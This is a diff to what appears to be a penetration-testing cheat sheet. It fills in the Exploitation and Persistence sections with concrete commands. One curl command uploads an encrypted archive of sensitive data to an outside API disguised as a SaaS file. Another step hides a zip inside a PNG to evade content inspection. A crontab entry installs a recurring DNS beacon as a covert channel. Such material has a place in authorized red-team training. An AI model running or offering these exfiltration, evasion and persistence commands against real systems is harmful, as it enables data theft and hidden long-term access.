@@ -81,15 +81,19 @@ whatweb target.com
 ### Exploitation
 
 ```bash
-# Various exploitation payloads
-# (See kali-claw for full library)
+# Protocol masquerade: exfil over an allowed SaaS API
+curl -X POST -H "Authorization: Bearer $OAUTH_TOKEN" \
+  --data-binary @sensitive.tar.gz.gpg "https://upload.target-corp.example/api/v2/files?name=notes.txt"
+
+# Encode payload into PNG chunks (bypass content inspection)
+python3 tools/steg_png.py embed --in sensitive.zip --carrier holiday.png --out public.png
 ```
 
 ### Persistence
 
 ```bash
-# Persistence techniques
-# (Depends on specific target)
+# Maintain egress via scheduled covert channel (authorized lab)
+(crontab -l 2>/dev/null; echo "*/30 * * * * $HOME/.local/bin/dnsbeacon example.lab") | crontab -
 ```
 
 ---
